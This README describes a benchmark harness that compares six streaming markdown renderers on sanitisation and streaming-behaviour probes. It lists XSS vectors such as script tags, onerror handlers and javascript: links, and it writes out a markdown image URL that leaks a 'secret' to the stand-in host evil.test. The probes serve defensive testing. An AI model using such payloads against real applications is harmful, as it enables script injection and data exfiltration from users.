# Library comparison

This folder measures limmat and five other streaming markdown renderers (streaming-markdown, Streamdown, markstream-vue, svelte-markdown, TanStack Markdown) with the same probes in real Chromium. The numbers behind the comparison table in the README come from `results.json`. Nothing here is a ranking of "best": each probe asks one narrow, checkable question.

## Run it

```sh
npm ci --ignore-scripts --prefix benchmarks/compare   # once: installs the competitors, only inside this folder
npm install --ignore-scripts --save-exact --prefix benchmarks/compare streamdown@latest streaming-markdown@latest markstream-vue@latest @humanspeak/svelte-markdown@latest @tanstack/markdown@latest react@latest react-dom@latest vue@latest svelte@latest   # before a release: bump the pins, then run `npm run compare`
npm run compare                                       # everything, about 4 minutes
node benchmarks/compare/run.mjs --no-meta             # offline, keeps the npm and GitHub values of the last run
node benchmarks/compare/run.mjs --once --only limmat,streamdown --probes p1,p6   # quick spike, writes nothing
```

You need the root dev dependencies (`npm ci --ignore-scripts` in the repository root) and Chromium (`npx playwright install chromium`). `npm run compare` builds limmat from this checkout first, so the limmat row is always the current master, labelled `<version> (master)`. Only the metadata step needs the network (`npm view` and `gh api`).

Files:

- `adapters/*.js`: one tiny adapter per library with the same surface, `window.LIB.create(container)` returning `{write, end, destroy}`. This is the "default" usage from each README quick start: no plugins, no options. Each adapter's first line says what it does.
- `probes.mjs`: the probes as data (payloads, sources, oracle) plus the function that decides pass, partial or fail.
- `canon.mjs`: the CommonMark normaliser. Every rule that exists for one library only is marked `LIBRARY-SPECIFIC`.
- `page.mjs`: the code that runs inside the page (stream, settle, scan, click).
- `run.mjs`: the harness. `meta.mjs`: package facts (versions, dates, dependency counts, gzip size).
- `results.json`: the result, one schema for all libraries. `probes.json`: the probe table. `commonmark-failures.json`: the CommonMark examples each library fails.

## How a probe runs

- A fresh browser context per (library, probe), service workers blocked.
- Only `https://app.test/` is answered. Every other request is logged by host and path and aborted, so `evil.test` URLs never leave the machine.
- Payloads call `window.__pwn(id)` instead of `alert`, and a dialog handler is a backup. `window.open` is recorded.
- Each payload is streamed whole (one write) and one character per write. After every write the harness waits about 60 ms plus two animation frames and then scans the DOM. No fake timers.
- Every (library, probe) pair runs twice in two fresh contexts. If the two runs disagree, the run stops and writes nothing.

## The probes

| id | question | pass | partial | fail |
|---|---|---|---|---|
| p1-raw-html | does raw `<script>`, `<img onerror>`, `<svg onload>`, `<iframe srcdoc>` run? | nothing ran, no active element | nothing ran, but an active element or on* attribute is in the DOM | a payload ran |
| p2-link-schemes | `javascript:`, mixed case, tab-split, `vbscript:`, `data:` links | all inert | only `javascript:` blocked, `data:` or `vbscript:` kept | a `javascript:` link survives or a click ran script |
| p3-remote-html | raw `<img src="https://evil.test/...">` | no request | none | any request without a click |
| p4-remote-md-image | `![x](https://evil.test/leak?q=secret)` | no request, or a click-to-load placeholder | none | any request without a click |
| p5-link-target | `target` and `rel` of a link (diagnostic only) | no target, or `_blank` with noopener | `_blank` without noopener | none |
| p6-markers | raw markers (`* _ ` ~ # [ ] \| > -`) visible while streaming one character at a time, over ten constructs | 0 leaks | 1 to 3 | 4 or more |
| p7-commonmark | the 652 CommonMark 0.31.2 examples | informational: a count, not a verdict | | |

Read the results this way:

- A request for a half-typed URL counts as a request (p4): a leak of the first characters of a secret is still a leak.
- p6 writes each document with letters only, so the final text has no marker. A construct that a library never renders (its final text still contains a marker) is `n/a`, not a leak. The thresholds are provisional, so read the raw counts (`leaked` of `constructs`). TanStack Markdown parses the whole text again on every update, so its p6 result describes how it behaves when used as its streaming guide shows.
- p7 uses one lenient normaliser for all five libraries (tag structure plus whitespace-collapsed text, attributes ignored) and a denominator of 652 for everyone. The strict count compares serialised HTML with no library-specific rule, the text-only count compares text only. The lenient count is the primary number.
- `totalDeps` counts the unique packages installed below the package in a clean install, without its peer dependencies (react, react-dom).
- `gzipBytes` is a one-import esbuild bundle, minified, gzip level 9. React libraries leave out react and react-dom. Streamdown loads shiki and mermaid lazily, and those chunks are not counted. See `gzipNote` in each tool.

## Dispute a result

If you think a probe is unfair, a payload is wrong, or a library is set up badly, open an issue or a pull request at https://github.com/DaanRosendal/limmat/issues. The most useful form is a change to `probes.mjs` or an adapter, with the output of `node benchmarks/compare/run.mjs --once --only <library> --probes <probe>`. A fix that changes a number in another library's favour is as welcome as one that changes it for limmat.
